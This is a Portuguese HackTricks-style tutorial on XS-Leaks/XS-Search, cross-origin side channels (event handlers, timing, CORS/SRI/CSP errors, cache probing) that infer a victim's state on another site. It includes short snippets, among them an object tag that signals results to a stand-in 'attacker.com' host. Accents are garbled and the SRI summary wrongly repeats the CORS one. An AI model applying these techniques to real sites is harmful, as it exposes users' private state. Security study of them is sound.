# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

XS-Search √© um m√©todo usado para **extrair informa√ß√µes de origens cruzadas** aproveitando **vulnerabilidades de canal lateral**.

Os componentes-chave envolvidos nesse ataque incluem:

* **Web Vulner√°vel**: O site de destino do qual as informa√ß√µes devem ser extra√≠das.
* **Web do Atacante**: O site malicioso criado pelo atacante, que a v√≠tima visita, hospedando o exploit.
* **M√©todo de Inclus√£o**: A t√©cnica empregada para incorporar a Web Vulner√°vel na Web do Atacante (por exemplo, window.open, iframe, fetch, tag HTML com href, etc.).
* **T√©cnica de Vazamento**: T√©cnicas usadas para discernir diferen√ßas no estado da Web Vulner√°vel com base nas informa√ß√µes coletadas por meio do m√©todo de inclus√£o.
* **Estados**: As duas condi√ß√µes potenciais da Web Vulner√°vel, que o atacante visa distinguir.
* **Diferen√ßas Detect√°veis**: Varia√ß√µes observ√°veis nas quais o atacante se baseia para inferir o estado da Web Vulner√°vel.

### Diferen√ßas Detect√°veis

V√°rios aspectos podem ser analisados para diferenciar os estados da Web Vulner√°vel:

* **C√≥digo de Status**: Distinguindo entre **v√°rios c√≥digos de status de resposta HTTP** de origens cruzadas, como erros de servidor, erros de cliente ou erros de autentica√ß√£o.
* **Uso de API**: Identificando **o uso de APIs da Web** em p√°ginas, revelando se uma p√°gina de origem cruzada emprega uma API da Web JavaScript espec√≠fica.
* **Redirecionamentos**: Detectando navega√ß√µes para p√°ginas diferentes, n√£o apenas redirecionamentos HTTP, mas tamb√©m aqueles acionados por JavaScript ou HTML.
* **Conte√∫do da P√°gina**: Observando **varia√ß√µes no corpo da resposta HTTP** ou em sub-recursos da p√°gina, como o **n√∫mero de frames incorporados** ou disparidades de tamanho em imagens.
* **Cabe√ßalho HTTP**: Observando a presen√ßa ou possivelmente o valor de um **cabe√ßalho de resposta HTTP espec√≠fico**, incluindo cabe√ßalhos como X-Frame-Options, Content-Disposition e Cross-Origin-Resource-Policy.
* **Tempo**: Observando disparidades de tempo consistentes entre os dois estados.

### M√©todos de Inclus√£o

* **Elementos HTML**: O HTML oferece v√°rios elementos para **inclus√£o de recursos de origem cruzada**, como folhas de estilo, imagens ou scripts, compelindo o navegador a solicitar um recurso n√£o HTML. Uma compila√ß√£o de elementos HTML potenciais para esse fim pode ser encontrada em [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Frames**: Elementos como **iframe**, **object** e **embed** podem incorporar recursos HTML diretamente na p√°gina do atacante. Se a p√°gina **n√£o tiver prote√ß√£o de enquadramento**, o JavaScript pode acessar o objeto window do recurso emoldurado por meio da propriedade contentWindow.
* **Pop-ups**: O m√©todo **`window.open`** abre um recurso em uma nova guia ou janela, fornecendo um **identificador de janela** para o JavaScript interagir com m√©todos e propriedades seguindo a SOP. Pop-ups, frequentemente usados em logins √∫nicos, contornam as restri√ß√µes de enquadramento e cookies de um recurso de destino. No entanto, os navegadores modernos restringem a cria√ß√£o de pop-ups a certas a√ß√µes do usu√°rio.
* **Requisi√ß√µes JavaScript**: O JavaScript permite solicita√ß√µes diretas a recursos de destino usando **XMLHttpRequests** ou a **Fetch API**. Esses m√©todos oferecem controle preciso sobre a solicita√ß√£o, como optar por seguir redirecionamentos HTTP.

### T√©cnicas de Vazamento

* **Manipulador de Eventos**: Uma t√©cnica de vazamento cl√°ssica em XS-Leaks, onde manipuladores de eventos como **onload** e **onerror** fornecem informa√ß√µes sobre o sucesso ou falha no carregamento do recurso.
* **Mensagens de Erro**: Exce√ß√µes JavaScript ou p√°ginas de erro especiais podem fornecer informa√ß√µes de vazamento diretamente da mensagem de erro ou diferenciando entre sua presen√ßa e aus√™ncia.
* **Limites Globais**: Limita√ß√µes f√≠sicas de um navegador, como capacidade de mem√≥ria ou outros limites impostos pelo navegador, podem sinalizar quando um limite √© atingido, servindo como t√©cnica de vazamento.
* **Estado Global**: Intera√ß√µes detect√°veis com os **estados globais dos navegadores** (por exemplo, a interface History) podem ser exploradas. Por exemplo, o **n√∫mero de entradas** no hist√≥rico de um navegador pode oferecer pistas sobre p√°ginas de origem cruzada.
* **API de Desempenho**: Esta API fornece **detalhes de desempenho da p√°gina atual**, incluindo cronometragem de rede para o documento e recursos carregados, permitindo infer√™ncias sobre os recursos solicitados.
* **Atributos Leg√≠veis**: Alguns atributos HTML s√£o **leg√≠veis de origem cruzada** e podem ser usados como t√©cnica de vazamento. Por exemplo, a propriedade `window.frame.length` permite que o JavaScript conte os frames inclu√≠dos em uma p√°gina da web de origem cruzada.

## Ferramenta XSinator & Paper

XSinator √© uma ferramenta autom√°tica para **verificar navegadores contra v√°rios XS-Leaks conhecidos** explicados em seu paper: **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

Voc√™ pode **acessar a ferramenta em [https://xsinator.com/](https://xsinator.com/)**

{% hint style="warning" %}
**XS-Leaks Exclu√≠dos**: Tivemos que excluir XS-Leaks que dependem de **service workers** pois interfeririam com outros vazamentos no XSinator. Al√©m disso, optamos por **excluir XS-Leaks que dependem de configura√ß√µes incorretas e bugs em um aplicativo web espec√≠fico**. Por exemplo, configura√ß√µes incorretas de Compartilhamento de Recursos de Origem Cruzada (CORS), vazamento de postMessage ou Cross-Site Scripting. Adicionalmente, exclu√≠mos XS-Leaks baseados em tempo, pois frequentemente sofrem com lentid√£o, ru√≠do e imprecis√£o.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **T√©cnicas Baseadas em Tempo**

Algumas das seguintes t√©cnicas v√£o usar o tempo como parte do processo para detectar diferen√ßas nos poss√≠veis estados das p√°ginas da web. Existem diferentes maneiras de medir o tempo em um navegador da web.

**Rel√≥gios**: A API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite que os desenvolvedores obtenham medi√ß√µes de tempo de alta resolu√ß√£o.\
H√° um n√∫mero consider√°vel de APIs que os atacantes podem abusar para criar rel√≥gios impl√≠citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), anima√ß√µes CSS e outros.\
Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## T√©cnicas de Manipulador de Eventos

### Onload/Onerror

* **M√©todos de Inclus√£o**: Frames, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumo**: se ao tentar carregar um recurso os eventos onerror/onload s√£o acionados com o carregamento do recurso bem-sucedido/malsucedido, √© poss√≠vel descobrir o c√≥digo de status.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

O exemplo de c√≥digo tenta **carregar objetos de scripts de JS**, mas **outros tags** como objetos, folhas de estilo, imagens, √°udios tamb√©m poderiam ser usados. Al√©m disso, tamb√©m √© poss√≠vel injetar a **tag diretamente** e declarar os eventos `onload` e `onerror` dentro da tag (em vez de injet√°-la a partir do JS).

H√° tamb√©m uma vers√£o sem script deste ataque:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Neste caso, se `example.com/404` n√£o for encontrado, `attacker.com/?error` ser√° carregado.

### Tempo de Carregamento

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumo:** A [**API performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. No entanto, outros rel√≥gios poderiam ser usados, como a [**API PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) que pode identificar tarefas em execu√ß√£o por mais de 50ms.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) outro exemplo em:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Tempo de Carregamento + Tarefa Pesada For√ßada

Essa t√©cnica √© semelhante √† anterior, mas o **atacante** tamb√©m ir√° **for√ßar** alguma a√ß√£o a levar um **tempo relevante** quando a **resposta for positiva ou negativa** e medir esse tempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Tempo de descarregamento/beforeunload

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumo:** O rel√≥gio [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) pode ser usado para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios poderiam ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

O tempo necess√°rio para buscar um recurso pode ser medido utilizando os eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) e [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). O evento **`beforeunload`** √© acionado quando o navegador est√° prestes a navegar para uma nova p√°gina, enquanto o evento **`unload`** ocorre quando a navega√ß√£o est√° realmente acontecendo. A diferen√ßa de tempo entre esses dois eventos pode ser calculada para determinar a **dura√ß√£o que o navegador passou buscando o recurso**.

### Tempo de Carregamento do Frame Isolado + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Resumo:** A [API performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios poderiam ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Observou-se que na aus√™ncia de [Prote√ß√µes de Enquadramento](https://xsleaks.dev/docs/defenses/opt-in/xfo/), o tempo necess√°rio para que uma p√°gina e seus subrecursos sejam carregados pela rede pode ser medido por um atacante. Essa medi√ß√£o √© tipicamente poss√≠vel porque o manipulador `onload` de um iframe √© acionado somente ap√≥s a conclus√£o do carregamento de recursos e da execu√ß√£o de JavaScript. Para contornar a variabilidade introduzida pela execu√ß√£o de script, um atacante pode empregar o atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dentro do `<iframe>`. A inclus√£o desse atributo restringe in√∫meras funcionalidades, especialmente a execu√ß√£o de JavaScript, facilitando assim uma medi√ß√£o que √© predominantemente influenciada pelo desempenho da rede.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + erro + onload

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**:
* **Resumo**: Se voc√™ puder fazer a p√°gina apresentar erro quando o conte√∫do correto √© acessado e carregar corretamente quando qualquer conte√∫do √© acessado, ent√£o voc√™ pode criar um loop para extrair todas as informa√ß√µes sem medir o tempo.
* **Exemplo de C√≥digo**:

Suponha que voc√™ possa **inserir** a **p√°gina** que tem o **conte√∫do secreto dentro de um Iframe**.

Voc√™ pode **fazer a v√≠tima pesquisar** pelo arquivo que cont√©m "_**flag**_" usando um **Iframe** (explorando um CSRF, por exemplo). Dentro do Iframe, voc√™ sabe que o _**evento onload**_ ser√° **sempre executado pelo menos uma vez**. Ent√£o, voc√™ pode **alterar** o **URL** do **iframe** mudando apenas o **conte√∫do** do **hash** dentro do URL.

Por exemplo:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Se o primeiro URL foi **carregado com sucesso**, ent√£o, ao **alterar** a parte **hash** do URL, o evento **onload** **n√£o ser√° acionado** novamente. Mas **se** a p√°gina teve algum tipo de **erro** ao **carregar**, ent√£o, o evento **onload** ser√° **acionado novamente**.

Dessa forma, voc√™ pode **distinguir entre** uma p√°gina **carregada corretamente** ou uma p√°gina que tem um **erro** ao ser acessada.

### Execu√ß√£o de Javascript

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**:
* **Resumo:** Se a **p√°gina** est√° **retornando** o **conte√∫do sens√≠vel**, **ou** um **conte√∫do** que pode ser **controlado** pelo usu√°rio. O usu√°rio poderia definir **c√≥digo JS v√°lido no caso negativo**, e **carregar** cada tentativa dentro de **`<script>`** tags, ent√£o em **casos negativos** o c√≥digo dos atacantes √© **executado**, e em **casos afirmativos** **nada** ser√° executado.
* **Exemplo de C√≥digo**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status e Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Resumo**: **Cross-Origin Read Blocking (CORB)** √© uma medida de seguran√ßa que impede que p√°ginas da web carreguem determinados recursos sens√≠veis de origens cruzadas para se proteger contra ataques como **Spectre**. No entanto, os atacantes podem explorar seu comportamento protetor. Quando uma resposta sujeita ao **CORB** retorna um `Content-Type` _**protegido pelo CORB**_ com `nosniff` e um c√≥digo de status `2xx`, o **CORB** remove o corpo e os cabe√ßalhos da resposta. Os atacantes que observam isso podem inferir a combina√ß√£o do **c√≥digo de status** (indicando sucesso ou erro) e o `Content-Type` (denotando se √© protegido pelo **CORB**), levando a um vazamento potencial de informa√ß√µes.
* **Exemplo de C√≥digo**:

Verifique o link de mais informa√ß√µes para obter mais detalhes sobre o ataque.

### onblur

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Resumo**: Vazamento de dados sens√≠veis do atributo id ou name.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

√â poss√≠vel **carregar uma p√°gina** dentro de um **iframe** e usar o **`#id_value`** para fazer a p√°gina **focar no elemento** do iframe com o id indicado, ent√£o se um sinal **`onblur`** for acionado, o elemento ID existe.\
Voc√™ pode realizar o mesmo ataque com tags **`portal`**.

### Transmiss√µes de postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Resumo**: Reunir informa√ß√µes sens√≠veis de um postMessage ou usar a presen√ßa de postMessages como um or√°culo para saber o status do usu√°rio na p√°gina.
* **Exemplo de C√≥digo**: `Qualquer c√≥digo ouvindo todos os postMessages.`

Aplica√ß√µes frequentemente utilizam transmiss√µes de [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para se comunicar entre diferentes origens. No entanto, esse m√©todo pode inadvertidamente expor **informa√ß√µes sens√≠veis** se o par√¢metro `targetOrigin` n√£o for especificado corretamente, permitindo que qualquer janela receba as mensagens. Al√©m disso, o simples ato de receber uma mensagem pode atuar como um **or√°culo**; por exemplo, certas mensagens podem ser enviadas apenas para usu√°rios logados. Portanto, a presen√ßa ou aus√™ncia dessas mensagens pode revelar informa√ß√µes sobre o estado ou identidade do usu√°rio, como se est√£o autenticados ou n√£o.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### Erro CORS

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Nas Declara√ß√µes de Seguran√ßa (SA), mensagens de erro CORS exp√µem inadvertidamente a URL completa de solicita√ß√µes redirecionadas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Essa t√©cnica permite a um atacante **extrair o destino de um redirecionamento de um site de origem cruzada** ao explorar como os navegadores baseados em Webkit lidam com solicita√ß√µes CORS. Especificamente, quando uma solicita√ß√£o **habilitada para CORS** √© enviada a um site de destino que emite um redirecionamento com base no estado do usu√°rio e o navegador subsequentemente nega a solicita√ß√£o, a **URL completa do destino do redirecionamento** √© divulgada na mensagem de erro. Essa vulnerabilidade n√£o apenas revela o fato do redirecionamento, mas tamb√©m exp√µe o ponto final do redirecionamento e quaisquer **par√¢metros de consulta sens√≠veis** que possa conter.

### Erro SRI

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Nas Declara√ß√µes de Seguran√ßa (SA), mensagens de erro CORS exp√µem inadvertidamente a URL completa de solicita√ß√µes redirecionadas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Um atacante pode explorar **mensagens de erro detalhadas** para deduzir o tamanho das respostas de origem cruzada. Isso √© poss√≠vel devido ao mecanismo de Integridade de Subrecursos (SRI), que usa o atributo de integridade para validar que os recursos buscados, frequentemente de CDNs, n√£o foram adulterados. Para que o SRI funcione em recursos de origem cruzada, estes devem ser **habilitados para CORS**; caso contr√°rio, n√£o est√£o sujeitos a verifica√ß√µes de integridade. Nas Declara√ß√µes de Seguran√ßa (SA), assim como no vazamento XS-Leak de erro CORS, uma mensagem de erro pode ser capturada ap√≥s uma solicita√ß√£o fetch com um atributo de integridade falhar. Os atacantes podem deliberadamente **desencadear esse erro** atribuindo um **valor de hash falso** ao atributo de integridade de qualquer solicita√ß√£o. Nas SA, a mensagem de erro resultante revela inadvertidamente o comprimento do conte√∫do do recurso solicitado. Essa divulga√ß√£o de informa√ß√µes permite a um atacante discernir varia√ß√µes no tamanho da resposta, abrindo caminho para ataques sofisticados de XS-Leak.

### Viola√ß√£o/Detec√ß√£o de CSP

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Resumo:** Permitindo apenas o site da v√≠tima no CSP, se tentarmos acess√°-lo e ele redirecionar para um dom√≠nio diferente, o CSP acionar√° um erro detect√°vel.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Um XS-Leak pode usar o CSP para detectar se um site de origem cruzada foi redirecionado para uma origem diferente. Esse vazamento pode detectar o redirecionamento, mas al√©m disso, o dom√≠nio do destino do redirecionamento vaza. A ideia b√°sica desse ataque √© **permitir o dom√≠nio de destino no site do atacante**. Uma vez que uma solicita√ß√£o √© feita para o dom√≠nio de destino, ele **redireciona** para um dom√≠nio de origem cruzada. O CSP bloqueia o acesso a ele e cria um **relat√≥rio de viola√ß√£o usado como t√©cnica de vazamento**. Dependendo do navegador, **esse relat√≥rio pode vazar a localiza√ß√£o de destino do redirecionamento**.\
Navegadores modernos n√£o indicar√£o a URL para a qual foi redirecionado, mas ainda √© poss√≠vel detectar que um redirecionamento de origem cruzada foi acionado.

### Cache

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Resumo:** Limpe o arquivo do cache. Abra a p√°gina de destino e verifique se o arquivo est√° presente no cache.
* **Exemplo de C√≥digo:**

Os navegadores podem usar um cache compartilhado para todos os sites. Independentemente de sua origem, √© poss√≠vel deduzir se uma p√°gina de destino **solicitou um arquivo espec√≠fico**.

Se uma p√°gina carrega uma imagem apenas se o usu√°rio estiver logado, voc√™ pode **invalidar** o **recurso** (para que n√£o seja mais armazenado em cache, se estiver, veja mais informa√ß√µes nos links), **realizar uma solicita√ß√£o** que poderia carregar esse recurso e tentar carregar o recurso **com uma solicita√ß√£o inv√°lida** (por exemplo, usando um cabe√ßalho de refer√™ncia muito longo). Se o carregamento do recurso **n√£o acionar nenhum erro**, √© porque ele est√° **em cache**.

### Diretiva CSP

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Resumo:** As diretivas de cabe√ßalho CSP podem ser sondadas usando o atributo iframe CSP, revelando detalhes da pol√≠tica.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Um recurso inovador no Google Chrome (GC) permite que p√°ginas da web **proponham uma Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)** definindo um atributo em um elemento iframe, com diretivas de pol√≠tica transmitidas juntamente com a solicita√ß√£o HTTP. Normalmente, o conte√∫do incorporado deve **autorizar isso via um cabe√ßalho HTTP**, ou uma **p√°gina de erro √© exibida**. No entanto, se o iframe j√° estiver sob uma CSP e a nova pol√≠tica proposta n√£o for mais restritiva, a p√°gina ser√° carregada normalmente. Esse mecanismo abre um caminho para um atacante **detectar diretivas CSP espec√≠ficas** de uma p√°gina de origem cruzada identificando a p√°gina de erro. Embora essa vulnerabilidade tenha sido marcada como corrigida, nossas descobertas revelam uma **nova t√©cnica de vazamento** capaz de detectar a p√°gina de erro, sugerindo que o problema subjacente nunca foi totalmente resolvido.

### **CORP**

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Resumo:** Recursos protegidos com a Pol√≠tica de Recursos de Origem Cruzada (CORP) gerar√£o um erro ao serem buscados de uma origem n√£o permitida.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

O cabe√ßalho CORP √© um recurso de seguran√ßa relativamente novo na plataforma web que, quando definido, **bloqueia solicita√ß√µes de origem cruzada no-cors para o recurso fornecido**. A presen√ßa do cabe√ßalho pode ser detectada, pois um recurso protegido com CORP **gerar√° um erro ao ser buscado**.

### CORB

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Resumo**: CORB pode permitir que os atacantes detectem quando o **cabe√ßalho `nosniff` est√° presente** na solicita√ß√£o.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Verifique o link para mais informa√ß√µes sobre o ataque.

### Erro CORS na m√° configura√ß√£o de Reflex√£o de Origem <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
